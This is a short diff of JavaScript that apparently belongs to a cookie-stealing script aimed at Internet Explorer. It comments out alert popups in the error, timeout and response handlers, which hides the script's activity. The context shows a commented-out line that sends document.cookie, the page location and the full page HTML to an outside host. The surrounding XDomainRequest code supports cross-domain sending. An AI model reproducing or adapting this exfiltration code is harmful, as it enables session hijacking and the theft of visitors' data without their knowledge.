@@ -38,13 +38,13 @@ if (detectIEregexp.test(navigator.userAgent)){ //if some form of IE
  //doRequest("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(document.documentElement.outerHTML)); 
 var xdr;
 function err() {
-    alert('Error');
+    //alert('Error');
 }
 function timeo() {
-    alert('Time off');
+    //alert('Time off');
 }
 function loadd() {
-    alert('Response: ' +xdr.responseText);
+    //alert('Response: ' +xdr.responseText);
 }
 function stopdata() {
     xdr.abort();
